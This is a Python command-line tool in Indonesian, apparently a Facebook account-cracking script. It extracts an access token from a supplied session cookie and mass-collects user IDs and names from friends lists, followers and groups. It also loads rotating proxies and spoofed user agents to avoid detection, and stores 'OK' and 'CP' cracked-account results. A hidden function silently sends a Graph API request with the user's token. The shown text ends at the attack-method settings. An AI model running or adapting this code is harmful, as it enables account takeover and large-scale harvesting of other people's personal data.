#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 11;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='redmi'
	e=random.randrange(100, 9999)
	f='21061119AG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari 537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; Android 4.4.4;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us;'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/'
	h=random.randrange(73,100)
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (iPhone;'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='20A5283p [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f'''\t{asu}                                             
            ,;;;;;;;,                                      
            ;;;;;;;;;;;,
           ;;;;;'_____;'                                            
           ;;;(/))))|((\\                                   
           _;;((((((|))))
          / |_\\\\\\\\\\\\\\\\\\\\\\\\
     .--~(  \\ ~))))))))))))
    /     \\  `\\-(((((((((((\\\\
    |    | `\\   ) |\\       /|)
     |    |  `. _/  \\_____/ |
      |    , `\\~            /
       |    \\  \\           /
      | `.   `\\|          /
      |   ~-   `\\        /
       \\____~._/~ -_,   (\\
        |-----|\\   \\    ';;
       |      | :;;;'     \\
      |  /    |            | 🅑🅨. 🅓🅘🅖🅘🅣🅐🅛 🅐🅛🅛🅘🅐🅝🅒🅔
      |       |            | 🆅🅴🆁🆂🅸🅾🅽 : 1.0.0
              '----"----'    
\t{m}•{k}•{h}•{sir} D̳̿͟͞I̳̿͟͞G̳̿͟͞I̳̿͟͞T̳̿͟͞A̳̿͟͞L̳̿͟͞ A̳̿͟͞L̳̿͟͞L̳̿͟͞I̳̿͟͞A̳̿͟͞N̳̿͟͞C̳̿͟͞E̳̿͟͞ F̳̿͟͞A̳̿͟͞C̳̿͟͞E̳̿͟͞B̳̿͟͞O̳̿͟͞O̳̿͟͞K̳̿͟͞ T̳̿͟͞O̳̿͟͞O̳̿͟͞L̳̿͟͞S̳̿͟͞  {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# 𝐏𝐑𝐎𝐁𝐋𝐄𝐌 𝐈𝐍𝐓𝐄𝐑𝐍𝐄𝐓 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐎𝐍, 𝐂𝐇𝐄𝐂𝐊 𝐀𝐍𝐃 𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\Digital [green]Alliance'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} 𝐋𝐎𝐆𝐈𝐍 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋.........𝐉𝐚𝐥𝐚𝐧𝐤𝐚𝐧 𝐋𝐚𝐠𝐢 𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡𝐧𝐲𝐚!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s 𝐋𝐎𝐆𝐈𝐍 𝐆𝐀𝐆𝐀𝐋.....𝐂𝐄𝐊 𝐓𝐔𝐌𝐁𝐀𝐋  !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/3902743?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	wa = '+6285888222944'
	cetak(nel('\tSelamat Datang [yellow]%s[white] '%(my_name)))
	print(f'╰─➣ Your ID : '+str(my_id))
	print(f'╰─➣ Your Ip  : {ip}')
	print(f'╰─➣ Whatsapp   : {wa}')
	print('')
	print('╰─➣ 1. Crack Publik ')
# print('>> 2. Crack Follower ')
# print('>> 3. Crack Grup   ')
# print('>> 4. Crack File	')
	print('╰─➣ 2. Hasil Crack  ')
	print('╰─➣ 0. Keluar       ')
	_____DIGITAL__ALLIANCE_____ = input('\n╰─➣ Pilih : ')
	if _____DIGITAL__ALLIANCE_____ in ['1']:
		dump_massal()
	elif _____DIGITAL__ALLIANCE_____ in ['2']:
		dump_follower()
	elif _____DIGITAL__ALLIANCE_____ in ['3']:
		grup()
	elif _____DIGITAL__ALLIANCE_____ in ['4']:
		login()
	elif _____DIGITAL__ALLIANCE_____ in ['5']:
		result()
	elif _____DIGITAL__ALLIANCE_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Harap Pilih Dengan Benar ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'╰─➣ 1. Hasil {h}OK{x} Anda ')
	print(f'╰─➣ 2. Hasil {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n╰─➣ Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'└── %s. %s ({k} %s {x}ID )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> 𝐏𝐢𝐥𝐢𝐡 𝐃𝐞𝐧𝐠𝐚𝐧 𝐁𝐞𝐧𝐞𝐫 𝐦𝐚𝐬 ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> 𝐅𝐢𝐥𝐞 𝐓𝐢𝐝𝐚𝐤 𝐃𝐢 𝐓𝐞𝐦𝐮𝐤𝐚𝐧 ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}└── {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} 𝐊𝐥𝐢𝐤 𝐄𝐧𝐭𝐞𝐫{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> 𝐅𝐢𝐥𝐞 𝐓𝐢𝐝𝐚𝐤 𝐃𝐢 𝐓𝐞𝐦𝐮𝐤𝐚𝐧 ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> 𝐀𝐧𝐝𝐚 𝐓𝐢𝐝𝐚𝐤 𝐌𝐞𝐦𝐩𝐮𝐧𝐲𝐚𝐢 𝐅𝐢𝐥𝐞 𝐎𝐊 ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'└── %s. %s ( {h}%s{x} ID )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'└── %s. %s ({h} %s {x}ID )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> 𝐏𝐢𝐥𝐢𝐡 𝐘𝐚𝐧𝐠 𝐁𝐞𝐧𝐞𝐫 𝐛𝐫𝐨 ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> 𝐅𝐢𝐥𝐞 𝐓𝐢𝐝𝐚𝐤 𝐃𝐢 𝐓𝐞𝐦𝐮𝐤𝐚𝐧 ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}└── {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} 𝐊𝐥𝐢𝐤 𝐄𝐧𝐭𝐞𝐫{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> 𝐏𝐢𝐥𝐢𝐡 𝐘𝐚𝐧𝐠 𝐁𝐞𝐧𝐞𝐫 𝐁𝐫𝐨 ')
		back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('╰─➣ 𝐌𝐚𝐮 𝐁𝐞𝐫𝐚𝐩𝐚 𝐁𝐚𝐧𝐲𝐚𝐤 𝐢𝐝 ? : '))
	except ValueError:
		print('>> 𝐌𝐚𝐬𝐮𝐤𝐤𝐚𝐧 𝐀𝐧𝐠𝐤𝐚 𝐁𝐮𝐤𝐚𝐧 𝐇𝐮𝐫𝐮𝐩 𝐁𝐫𝐨 ')
		exit()
	if jum<1 or jum>100:
		print('└── 𝐆𝐚𝐠𝐚𝐥 𝐃𝐮𝐦𝐩 𝐈𝐝 ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('╰─➣ 𝐌𝐚𝐬𝐮𝐤𝐤𝐚𝐧 𝐈𝐝 𝐘𝐚𝐧𝐠 𝐊𝐞 '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> 𝐊𝐨𝐧𝐞𝐤𝐬𝐢 𝐉𝐞𝐥𝐞𝐤 𝐁𝐑𝐎 ')
			exit()
	try:
		print('')
		print(f'╰─➣ 𝐓𝐨𝐭𝐚𝐥 𝐈𝐝 𝐘𝐚𝐧𝐠 𝐓𝐞𝐫𝐤𝐮𝐦𝐩𝐮𝐥 🐷{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> 𝐊𝐨𝐧𝐞𝐤𝐬𝐢 𝐉𝐞𝐥𝐞𝐤 𝐁𝐚𝐧𝐠 ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} 𝐏𝐞𝐫𝐭𝐞𝐦𝐚𝐧𝐚𝐧 𝐓𝐢𝐝𝐚𝐤 𝐏𝐮𝐛𝐥𝐢𝐤 {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('>> Masukkan ID Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/10100622922839470'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'>> Total ID :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> 𝐊𝐨𝐧𝐞𝐤𝐬𝐢 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐁𝐞𝐫𝐦𝐚𝐬𝐚𝐥𝐚𝐡 ')
		exit()
	except (KeyError,IOError):
		print('>> 𝐆𝐚𝐠𝐚𝐥 𝐌𝐞𝐧𝐠𝐚𝐦𝐛𝐢𝐥 𝐓𝐚𝐫𝐠𝐞𝐭 ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print(f'\n{x}>> 𝐓𝐨𝐭𝐚𝐥 𝐈𝐝 𝐘𝐚𝐧𝐠 𝐓𝐞𝐫𝐤𝐮𝐦𝐩𝐮𝐥 :{h} %s '%(len(id)))
	input(f'{x}>> [ {m}𝐊𝐥𝐢𝐤 𝐄𝐧𝐭𝐞𝐫 {x}] ')
	print('')
	pass
	setting()
def grup():
	print('')
	id = input(f'{x}>> 𝐌𝐚𝐬𝐮𝐤𝐤𝐚𝐧 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 𝐀𝐭𝐚𝐮 𝐈𝐝 𝐆𝐫𝐮𝐩 : ')
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
	except requests.exceptions.ConnectionError:
		print('>> Sinyal Loo Kek Kontol ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(" 𝐓𝐞𝐫𝐤𝐞𝐧𝐚 𝐋𝐢𝐦𝐢𝐭, 𝐒𝐢𝐥𝐚𝐡𝐤𝐚𝐧 𝐌𝐨𝐝𝐞 𝐏𝐞𝐬𝐚𝐰𝐚𝐭 𝐃𝐚𝐧 𝐂𝐨𝐛𝐚 𝐋𝐚𝐠𝐢..")
		time.sleep(0.5)
		grup()
	elif berr2=='Kesalahan':
		alvino_xy('>> Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
	print(f'{x}>> Nama Grup : {b}%s'%(berr2))
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(" Anggota : -")
	else:
		print(f'{x}>> Anggota : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}>> 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝘂𝗺𝗽𝘂𝗹𝗸𝗮𝗻 𝗜𝗗 ')
	print(f'>> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
	while True:
		try:
			ua = 'Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						xy = random.choice([m,k,h,u,b,x])
						print(f'\r	———>> {x}({xy} %s {x}) <<———'%(len(id)), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/download')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] download[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> 𝗣𝗶𝗹𝗶𝗵 𝗬𝗮𝗻𝗴 𝗕𝗲𝗻𝗲𝗿 𝗕𝗿𝗼 ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] 𝐀𝐥𝐡𝐚𝐦𝐝𝐮𝐥𝐢𝐥𝐥𝐚𝐡 𝐀𝐧𝐝𝐚 𝐒𝐮𝐧𝐠𝐠𝐮𝐡 𝐏𝐢𝐧𝐭𝐚𝐫 ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] 𝐀𝐧𝐝𝐚 𝐒𝐮𝐧𝐠𝐠𝐮𝐡 𝐆𝐎𝐁𝐋𝐎𝐆 ')
			time.sleep(3)
			exit()
		print('>> 𝐀𝐧𝐝𝐚 𝐓𝐢𝐝𝐚𝐤 𝐌𝐞𝐦𝐢𝐥𝐢𝐤𝐢 𝐅𝐢𝐥𝐞 𝐃𝐮𝐦𝐩 ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/download/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} ID )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}ID) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> 𝐏𝐢𝐥𝐢𝐡 𝐘𝐚𝐧𝐠 𝐁𝐞𝐧𝐞𝐫 𝐊𝐨𝐧𝐭𝐨𝐥 {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/download/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-ID ]---------------#
def setting():
	print(f'{x}╰─➣ 𝟏. 𝐎𝐥𝐝 𝐈𝐃 ( 𝐓𝐢𝐝𝐚𝐤 𝐑𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐚𝐬𝐢 )  ')
	print('╰─➣ 𝟐. 𝐍𝐞𝐰 𝐈𝐃 ( 𝐑𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐚𝐬𝐢 ) ')
	print('╰─➣ 𝟑. 𝐑𝐚𝐧𝐝𝐨𝐦 𝐈𝐃 ( 𝐒𝐚𝐧𝐠𝐚𝐭 𝐑𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐚𝐬𝐢 )  ')
	print('')
	hu = input('╰─➣ Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print('╰─➣ 𝟏. 𝐌.𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤 ( 𝐒𝐚𝐧𝐠𝐚𝐭 𝐑𝐞𝐤𝐨𝐦𝐞𝐧𝐝𝐚𝐬𝐢 )  ')
	print('╰─➣ 𝟐. 𝐌𝐛𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤 ')
	print('╰─➣ 𝟑. 𝐓𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤  ')
	print('╰─➣ 𝟒. 𝐌𝐭𝐟𝐚𝐜𝐞𝐛𝐨𝐨𝐤 ')
	print('')
	hc = input('╰─➣ Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> Pilih Dengan Benar Bang ')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('╰─➣ 𝐓𝐚𝐦𝐛𝐚𝐡𝐤𝐚𝐧 𝐀𝐩𝐥𝐢𝐤𝐚𝐬𝐢 ( 𝐘/𝐭 ) ')
	if _jembot_ in ['']:
		print('>> 𝐏𝐢𝐥𝐢𝐡 𝐘𝐚𝐧𝐠 𝐁𝐞𝐧𝐞𝐫 𝐊𝐨𝐧𝐭𝐨𝐥 ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
